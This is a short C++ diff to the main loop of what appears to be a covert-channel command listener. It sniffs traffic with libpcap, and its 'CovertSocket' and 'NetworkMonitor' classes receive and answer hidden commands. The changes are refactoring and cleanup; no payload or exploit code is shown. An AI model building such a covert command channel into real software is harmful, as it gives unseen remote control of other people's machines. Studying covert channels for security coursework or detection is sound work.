@@ -14,6 +14,8 @@ pcap_if_t * listeningInterface = nullptr;
 
 bool keepListening = true;
 
+NetworkMonitor * monitor = nullptr;
+
 void shutdownServer(int signo){
     cout << "Terminating Program" << endl;
 
@@ -23,6 +25,7 @@ void shutdownServer(int signo){
     allInterfaces = nullptr;
     listeningInterface = nullptr;
 
+    monitor->killListening();
 }
 
 bool getInterface(){
@@ -99,17 +102,24 @@ int main(int argc, char * argv[]) {
     Logger::debug("Finding Interfaces");
 
 
-    TrafficAnalyzer * trafficAnalyzer = new TrafficAnalyzer();
+    TrafficAnalyzer * trafficAnalyzer = TrafficAnalyzer::getInstance();
     //start monitoring for UDP traffic. If it is our own, it needs handling, if not, add it to traffic analyzer
     CovertSocket * socket = new CovertSocket(trafficAnalyzer); //how we respond to commands
-    NetworkMonitor * monitor = new NetworkMonitor(trafficAnalyzer); //how we listen for commands
+    monitor = new NetworkMonitor(trafficAnalyzer); //how we listen for commands
     while(keepListening){
 
-        monitor->listenForTraffic(); //this will hang until a single unit of data is received and then return it
+        string command = monitor->listenForTraffic(listeningInterface); //this will hang until a single unit of data is received and then return it
 
 
     }
 
     Logger::debug("Loop Killed. Terminating");
+
+    delete(socket);
+    delete(monitor);
+
+    socket = nullptr;
+    monitor = nullptr;
+
     return 0;
 }
